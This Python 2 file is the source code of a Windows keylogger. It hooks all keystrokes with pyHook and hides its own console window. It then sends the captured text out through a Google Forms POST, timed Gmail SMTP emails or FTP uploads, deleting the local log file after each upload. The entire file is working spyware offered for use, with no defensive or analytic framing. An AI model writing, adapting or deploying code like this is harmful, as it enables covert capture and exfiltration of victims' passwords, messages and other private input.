import pythoncom, pyHook
import os
import sys
import threading
import urllib,urllib2
import smtplib
import ftplib
import datetime,time
import win32event, win32api, winerror

mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
x=''
data=''
count=0

def hide():
    import win32console,win32gui
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

def local():
    global data
    if len(data)>100:
        fp=open("keylogs.txt","a")
        fp.write(data)
        fp.close()
        data=''
    return True

def remote():
    global data
    if len(data)>100:
        url="https://docs.google.com/forms/d/xxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
        klog={'entry.xxxxxxxxxxx':data}
        try:
            dataenc=urllib.urlencode(klog)
            req=urllib2.Request(url,dataenc)
            response=urllib2.urlopen(req)
            data=''
        except Exception as e:
            print e
    return True

class TimerClass(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.event = threading.Event()
    def run(self):
        while not self.event.is_set():
            global data
            if len(data)>100:
                ts = datetime.datetime.now()
                SERVER = "smtp.gmail.com"
                PORT = 587
                USER="your_email@gmail.com"
                PASS="password_here"
                FROM = USER
                TO = ["to_address@gmail.com"] 
                SUBJECT = "Keylogger data: "+str(ts)
                MESSAGE = data
                message = """\
From: %s
To: %s
Subject: %s
%s
""" % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
                try:
                    server = smtplib.SMTP()
                    server.connect(SERVER,PORT)
                    server.starttls()
                    server.login(USER,PASS)
                    server.sendmail(FROM, TO, message)
                    data=''
                    server.quit()
                except Exception as e:
                    print e
            self.event.wait(120)

def ftp():
    global data,count
    if len(data)>100:
        count+=1
        FILENAME="logs-"+str(count)+".txt"
        fp=open(FILENAME,"a")
        fp.write(data)
        fp.close()
        data=''
        try:
            SERVER="ftp.xxxxxx.com"
            USERNAME="ftp_username"
            PASSWORD="ftp_password"
            SSL=0
            OUTPUT_DIR="/"
            if SSL==0:
                ft=ftplib.FTP(SERVER,USERNAME,PASSWORD)
            elif SSL==1:
                ft=ftplib.FTP_TLS(SERVER,USERNAME,PASSWORD)
            ft.cwd(OUTPUT_DIR)
            fp=open(FILENAME,'rb')
            cmd= 'STOR' +' '+FILENAME
            ft.storbinary(cmd,fp)
            ft.quit()
            fp.close()
            os.remove(FILENAME)
        except Exception as e:
            print e
    return True

def main():
    global x
    if sys.argv[1]=="local":
        x=1
        hide()
    elif sys.argv[1]=="remote":
        x=2
        hide()
    elif sys.argv[1]=="email":
        hide()
        email=TimerClass()
        email.start()
    elif sys.argv[1]=="ftp":
        x=4
        hide()
    return True
main()

def keypressed(event):
    global x,data
    if event.Ascii==13:
        keys='<ENTER>'
    elif event.Ascii==8:
        keys='<BACK SPACE>'
    elif event.Ascii==9:
        keys='<TAB>'
    else:
        keys=chr(event.Ascii)
    data=data+keys 
    if x==1:  
        local()
    elif x==2:
        remote()
    elif x==4:
        ftp()

obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()